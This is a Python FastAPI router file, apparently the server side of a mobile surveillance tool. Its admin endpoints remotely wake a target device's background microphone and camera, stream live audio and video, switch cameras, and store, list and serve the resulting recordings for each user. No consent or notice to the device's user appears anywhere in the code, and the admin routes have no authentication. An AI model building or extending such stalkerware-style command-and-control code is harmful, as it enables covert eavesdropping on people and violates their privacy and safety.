import os
import time
import json
import uuid
import shutil
from datetime import datetime
from typing import Optional, List
from fastapi import APIRouter, HTTPException, WebSocket, WebSocketDisconnect, UploadFile, File, Form
from fastapi.responses import FileResponse

try:
    from database import get_db
    from websocket_manager import ws_manager
    from config import (
        AGORA_APP_ID, AGORA_APP_CERTIFICATE, RtcTokenBuilder, Role_Publisher,
        RECORDED_STREAMS_DIR, format_stream_duration, format_stream_bytes, logger
    )
except ImportError:
    from server.database import get_db
    from server.websocket_manager import ws_manager
    from server.config import (
        AGORA_APP_ID, AGORA_APP_CERTIFICATE, RtcTokenBuilder, Role_Publisher,
        RECORDED_STREAMS_DIR, format_stream_duration, format_stream_bytes, logger
    )

router = APIRouter(tags=["Surveillance & Stream Management"])

# --- AUDIO & CAMERA LIVE SURVEILLANCE FEEDS ---

@router.post("/api/admin/devices/{device_id}/start-audio-feed")
async def admin_start_audio_feed(device_id: str):
    """
    Dispatches ACTION_START_AUDIO_FEED to wake the target device's
    background microphone service and stream ambient audio level data.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")

    device = dict(row)
    targets = [device_id]
    if device.get("username") and device["username"] != "Current User":
        targets.append(device["username"])
    if device.get("user_id"):
        targets.append(device["user_id"])

    clean_id = "".join(c for c in device_id if c.isalnum())[:8] or "dev"
    channel_name = f"audio_feed_{clean_id}_{int(time.time())}"
    app_id = AGORA_APP_ID
    app_cert = AGORA_APP_CERTIFICATE
    token = ""

    if RtcTokenBuilder and Role_Publisher and app_id and app_cert:
        try:
            expiration = 86400
            privilege_expired_ts = int(time.time()) + expiration
            token = RtcTokenBuilder.buildTokenWithUid(
                app_id, app_cert, channel_name, 0, Role_Publisher, privilege_expired_ts
            )
        except Exception as e:
            logger.warning(f"Failed to generate Agora token for audio feed: {e}")

    payload = {
        "type": "ACTION_START_AUDIO_FEED",
        "device_id": device_id,
        "channel_name": channel_name,
        "token": token,
        "agora_app_id": app_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(payload, target)
        if success:
            delivered = True
            break

    return {
        "status": "success",
        "channel_name": channel_name,
        "token": token,
        "agora_app_id": app_id,
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Audio feed start command dispatched to device {device_id}"
    }

@router.post("/api/admin/devices/{device_id}/stop-audio-feed")
async def admin_stop_audio_feed(device_id: str):
    """
    Sends a WebSocket command to the target device to stop the
    ambient audio monitoring service.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")

    device = dict(row)
    targets = [device_id]
    if device.get("username") and device["username"] != "Current User":
        targets.append(device["username"])
    if device.get("user_id"):
        targets.append(device["user_id"])

    payload = {
        "type": "ACTION_STOP_AUDIO_FEED",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(payload, target)
        if success:
            delivered = True
            break

    return {
        "status": "success",
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Audio feed stop command dispatched to device {device_id}"
    }

@router.post("/api/admin/devices/{device_id}/start-camera-feed")
async def admin_start_camera_feed(device_id: str):
    """
    Validates target device, generates Agora RTC channel name & token,
    dispatches ACTION_START_CAMERA_FEED to device via WebSocket.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")

    device = dict(row)
    targets = [device_id]
    if device.get("username") and device["username"] != "Current User":
        targets.append(device["username"])
    if device.get("user_id"):
        targets.append(device["user_id"])

    clean_id = "".join(c for c in device_id if c.isalnum())[:8] or "dev"
    channel_name = f"camera_session_{clean_id}_{int(time.time())}"
    app_id = AGORA_APP_ID
    app_cert = AGORA_APP_CERTIFICATE
    token = ""

    if RtcTokenBuilder and Role_Publisher and app_id and app_cert:
        try:
            expiration = 86400
            privilege_expired_ts = int(time.time()) + expiration
            token = RtcTokenBuilder.buildTokenWithUid(
                app_id, app_cert, channel_name, 0, Role_Publisher, privilege_expired_ts
            )
        except Exception as e:
            logger.warning(f"Failed to generate Agora token for camera feed: {e}")

    payload = {
        "type": "ACTION_START_CAMERA_FEED",
        "device_id": device_id,
        "channel_name": channel_name,
        "token": token,
        "agora_app_id": app_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(payload, target)
        if success:
            delivered = True
            break

    return {
        "status": "success",
        "channel_name": channel_name,
        "token": token,
        "agora_app_id": app_id,
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Camera feed start command dispatched to device {device_id}"
    }

@router.post("/api/admin/devices/{device_id}/stop-camera-feed")
async def admin_stop_camera_feed(device_id: str):
    """
    Sends WebSocket command to target device to stop camera streaming service.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")

    device = dict(row)
    targets = [device_id]
    if device.get("username") and device["username"] != "Current User":
        targets.append(device["username"])
    if device.get("user_id"):
        targets.append(device["user_id"])

    payload = {
        "type": "ACTION_STOP_CAMERA_FEED",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(payload, target)
        if success:
            delivered = True
            break

    return {
        "status": "success",
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Camera feed stop command dispatched to device {device_id}"
    }

@router.post("/api/admin/devices/{device_id}/switch-camera")
async def admin_switch_camera(device_id: str):
    """
    Sends WebSocket command to target device to toggle front/back camera.
    """
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")

    device = dict(row)
    targets = [device_id]
    if device.get("username") and device["username"] != "Current User":
        targets.append(device["username"])
    if device.get("user_id"):
        targets.append(device["user_id"])

    payload = {
        "type": "ACTION_SWITCH_CAMERA_FEED",
        "device_id": device_id,
        "timestamp": int(time.time() * 1000)
    }

    delivered = False
    for target in targets:
        success = await ws_manager.send_personal_message(payload, target)
        if success:
            delivered = True
            break

    return {
        "status": "success",
        "device_id": device_id,
        "delivered": delivered,
        "message": f"Camera switch command dispatched to device {device_id}"
    }

# Persistent WebSocket for receiving real-time audio dB level data from device
@router.websocket("/ws/audio-feed/{device_id}")
async def audio_feed_websocket(websocket: WebSocket, device_id: str):
    await websocket.accept()
    try:
        while True:
            data_str = await websocket.receive_text()
            try:
                data = json.loads(data_str)
                data["device_id"] = device_id
                data["type"] = "AUDIO_LEVEL_UPDATE"
                await ws_manager.send_personal_message(data, "admin")
            except Exception as e:
                logger.warning(f"[AudioFeed] Parse error from device {device_id}: {e}")
    except WebSocketDisconnect:
        logger.info(f"[AudioFeed] Device {device_id} disconnected from audio feed WebSocket")

# --- RECORDED STREAMS STORAGE & MANAGEMENT ---

@router.post("/api/admin/streams/upload")
async def upload_recorded_stream(
    file: UploadFile = File(...),
    device_id: str = Form(...),
    username: Optional[str] = Form(None),
    user_id: Optional[str] = Form(None),
    stream_type: str = Form("video"),
    channel_name: Optional[str] = Form(None),
    duration_seconds: Optional[int] = Form(0),
    mime_type: Optional[str] = Form(None)
):
    """
    Saves an incoming recorded video/audio stream file into server storage
    under storage/recorded_streams/{device_id}/, records metadata in SQLite,
    and broadcasts a real-time event to admin dashboards.
    """
    device_dir = os.path.join(RECORDED_STREAMS_DIR, device_id)
    os.makedirs(device_dir, exist_ok=True)

    stream_id = str(uuid.uuid4())
    now = int(time.time() * 1000)
    clean_type = "video" if "video" in (stream_type or "").lower() else "audio"

    detected_mime = mime_type or file.content_type or ("video/webm" if clean_type == "video" else "audio/webm")
    ext = ".webm"
    if "mp4" in detected_mime.lower():
        ext = ".mp4"
    elif "ogg" in detected_mime.lower() or "opus" in detected_mime.lower():
        ext = ".ogg"
    elif "wav" in detected_mime.lower():
        ext = ".wav"
    elif "webm" in detected_mime.lower():
        ext = ".webm" if clean_type == "video" else ".weba"

    timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"stream_{clean_type}_{timestamp_str}_{stream_id[:8]}{ext}"
    target_path = os.path.join(device_dir, filename)

    with open(target_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    size_bytes = os.path.getsize(target_path)

    conn = get_db()
    cursor = conn.cursor()

    resolved_username = username
    resolved_user_id = user_id

    if not resolved_username or resolved_username == "Current User":
        cursor.execute("SELECT username, user_id FROM devices WHERE device_id = ?", (device_id,))
        dev_row = cursor.fetchone()
        if dev_row:
            resolved_username = dev_row["username"] or "unknown_user"
            if not resolved_user_id:
                resolved_user_id = dev_row["user_id"]
        else:
            resolved_username = "unknown_user"

    cursor.execute("""
        INSERT INTO recorded_streams (
            id, device_id, user_id, username, stream_type,
            channel_name, filename, file_path, size_bytes,
            duration_seconds, mime_type, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        stream_id, device_id, resolved_user_id, resolved_username, clean_type,
        channel_name, filename, target_path, size_bytes,
        duration_seconds or 0, detected_mime, now
    ))
    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "STREAM_RECORDING_SAVED",
        "stream_id": stream_id,
        "device_id": device_id,
        "username": resolved_username,
        "stream_type": clean_type,
        "duration_seconds": duration_seconds or 0,
        "size_bytes": size_bytes,
        "created_at": now
    })

    return {
        "status": "success",
        "stream_id": stream_id,
        "filename": filename,
        "stream_type": clean_type,
        "size_bytes": size_bytes,
        "size_formatted": format_stream_bytes(size_bytes),
        "duration_seconds": duration_seconds or 0,
        "duration_formatted": format_stream_duration(duration_seconds or 0),
        "message": f"Successfully stored {clean_type} stream recording"
    }

@router.get("/api/admin/streams")
def get_recorded_streams(
    username: Optional[str] = None,
    device_id: Optional[str] = None,
    stream_type: Optional[str] = None
):
    """
    Returns recorded video and audio streams with full user and device metadata.
    Supports filtering by username, device_id, and stream_type (video/audio).
    """
    conn = get_db()
    cursor = conn.cursor()

    query = """
        SELECT rs.*, d.device_model, u.display_name, u.avatar_url
        FROM recorded_streams rs
        LEFT JOIN devices d ON rs.device_id = d.device_id
        LEFT JOIN users u ON rs.username = u.username
        WHERE 1=1
    """
    params = []

    if username and username != "ALL":
        query += " AND rs.username = ?"
        params.append(username)
    if device_id and device_id != "ALL":
        query += " AND rs.device_id = ?"
        params.append(device_id)
    if stream_type and stream_type != "ALL":
        query += " AND LOWER(rs.stream_type) = LOWER(?)"
        params.append(stream_type)

    query += " ORDER BY rs.created_at DESC"

    cursor.execute(query, tuple(params))
    rows = cursor.fetchall()
    conn.close()

    results = []
    for row in rows:
        r = dict(row)
        sz = r["size_bytes"] or 0
        dur = r["duration_seconds"] or 0
        user_name = r["username"] or "Unknown"
        disp_name = r["display_name"] or user_name
        dev_model = r["device_model"] or r["device_id"]
        results.append({
            "id": r["id"],
            "device_id": r["device_id"],
            "device_model": dev_model,
            "user_id": r["user_id"],
            "username": user_name,
            "display_name": disp_name,
            "avatar_url": r["avatar_url"],
            "stream_type": r["stream_type"],
            "channel_name": r["channel_name"],
            "filename": r["filename"],
            "size_bytes": sz,
            "size_formatted": format_stream_bytes(sz),
            "duration_seconds": dur,
            "duration_formatted": format_stream_duration(dur),
            "mime_type": r["mime_type"],
            "created_at": r["created_at"],
            "download_url": f"/api/admin/streams/download/{r['id']}",
            "play_url": f"/api/admin/streams/play/{r['id']}"
        })

    return results

@router.get("/api/admin/streams/summary")
def get_streams_summary():
    """
    Returns aggregated metrics and user-wise streaming statistics.
    """
    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("""
        SELECT 
            COUNT(*) as total_streams,
            SUM(CASE WHEN LOWER(stream_type) = 'video' THEN 1 ELSE 0 END) as video_streams,
            SUM(CASE WHEN LOWER(stream_type) = 'audio' THEN 1 ELSE 0 END) as audio_streams,
            COALESCE(SUM(size_bytes), 0) as total_bytes
        FROM recorded_streams
    """)
    totals = dict(cursor.fetchone() or {})

    cursor.execute("""
        SELECT 
            rs.username,
            u.display_name,
            u.avatar_url,
            d.device_id,
            d.device_model,
            COUNT(rs.id) as total_streams,
            SUM(CASE WHEN LOWER(rs.stream_type) = 'video' THEN 1 ELSE 0 END) as video_count,
            SUM(CASE WHEN LOWER(rs.stream_type) = 'audio' THEN 1 ELSE 0 END) as audio_count,
            COALESCE(SUM(rs.size_bytes), 0) as total_bytes,
            MAX(rs.created_at) as last_recorded_at
        FROM recorded_streams rs
        LEFT JOIN devices d ON rs.device_id = d.device_id
        LEFT JOIN users u ON rs.username = u.username
        GROUP BY rs.username
        ORDER BY last_recorded_at DESC
    """)
    user_rows = cursor.fetchall()
    conn.close()

    user_summary = []
    for ur in user_rows:
        u_dict = dict(ur)
        ub = u_dict["total_bytes"] or 0
        user_name = u_dict["username"] or "Unknown"
        user_summary.append({
            "username": user_name,
            "display_name": u_dict["display_name"] or user_name,
            "avatar_url": u_dict["avatar_url"],
            "device_id": u_dict["device_id"] or "",
            "device_model": u_dict["device_model"] or "Unknown Device",
            "total_streams": u_dict["total_streams"] or 0,
            "video_count": u_dict["video_count"] or 0,
            "audio_count": u_dict["audio_count"] or 0,
            "total_bytes": ub,
            "total_bytes_formatted": format_stream_bytes(ub),
            "last_recorded_at": u_dict["last_recorded_at"]
        })

    total_b = totals.get("total_bytes") or 0
    return {
        "total_streams": totals.get("total_streams") or 0,
        "video_streams": totals.get("video_streams") or 0,
        "audio_streams": totals.get("audio_streams") or 0,
        "total_bytes": total_b,
        "total_storage_formatted": format_stream_bytes(total_b),
        "user_summary": user_summary
    }

@router.get("/api/admin/streams/download/{stream_id}")
def download_recorded_stream(stream_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM recorded_streams WHERE id = ? OR filename = ?", (stream_id, stream_id))
    row = cursor.fetchone()
    conn.close()

    if not row or not os.path.exists(row["file_path"]):
        raise HTTPException(status_code=404, detail="Stream recording not found")

    filename = row["filename"]
    mime_type = row["mime_type"] or "application/octet-stream"
    return FileResponse(
        path=row["file_path"],
        filename=filename,
        media_type=mime_type,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Access-Control-Expose-Headers": "Content-Disposition"
        }
    )

@router.get("/api/admin/streams/play/{stream_id}")
def play_recorded_stream(stream_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM recorded_streams WHERE id = ? OR filename = ?", (stream_id, stream_id))
    row = cursor.fetchone()
    conn.close()

    if not row or not os.path.exists(row["file_path"]):
        raise HTTPException(status_code=404, detail="Stream recording not found")

    mime_type = row["mime_type"] or "video/webm"
    return FileResponse(
        path=row["file_path"],
        media_type=mime_type,
        headers={
            "Content-Disposition": "inline",
            "Accept-Ranges": "bytes"
        }
    )

@router.delete("/api/admin/streams/{stream_id}")
async def delete_recorded_stream(stream_id: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM recorded_streams WHERE id = ?", (stream_id,))
    row = cursor.fetchone()

    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Stream recording not found")

    file_path = row["file_path"]
    cursor.execute("DELETE FROM recorded_streams WHERE id = ?", (stream_id,))
    conn.commit()
    conn.close()

    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        logger.warning(f"Failed to remove stream file {file_path}: {e}")

    await ws_manager.broadcast_all({
        "type": "STREAM_RECORDING_DELETED",
        "stream_id": stream_id
    })

    return {"status": "success", "message": "Stream recording deleted successfully"}

@router.post("/api/admin/streams/bulk-delete")
async def bulk_delete_recorded_streams(data: dict):
    stream_ids = data.get("stream_ids", [])
    if not stream_ids:
        raise HTTPException(status_code=400, detail="No stream IDs provided")

    conn = get_db()
    cursor = conn.cursor()

    deleted_count = 0
    for sid in stream_ids:
        cursor.execute("SELECT file_path FROM recorded_streams WHERE id = ?", (sid,))
        row = cursor.fetchone()
        if row:
            fpath = row["file_path"]
            try:
                if os.path.exists(fpath):
                    os.remove(fpath)
            except Exception:
                pass
            cursor.execute("DELETE FROM recorded_streams WHERE id = ?", (sid,))
            deleted_count += 1

    conn.commit()
    conn.close()

    await ws_manager.broadcast_all({
        "type": "STREAM_RECORDINGS_BULK_DELETED",
        "count": deleted_count
    })

    return {"status": "success", "deleted_count": deleted_count}
